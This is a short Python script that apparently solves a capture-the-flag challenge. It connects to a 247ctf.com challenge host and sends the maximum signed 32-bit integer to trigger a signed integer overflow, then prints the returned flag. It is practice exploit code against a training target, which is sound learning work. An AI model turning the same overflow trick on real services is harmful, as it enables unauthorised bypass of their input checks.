import socket

ctf_url = "2891f9fdf99420d3.247ctf.com"
ctf_port = 50172

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ctf_url, ctf_port))
max_int32 = 2147483647
sock.send(f"{max_int32}\n".encode()) # Signed Integer Overflow #
flag = sock.recv(1024).decode().replace('\n', '')
print(f"FLAG: {flag}")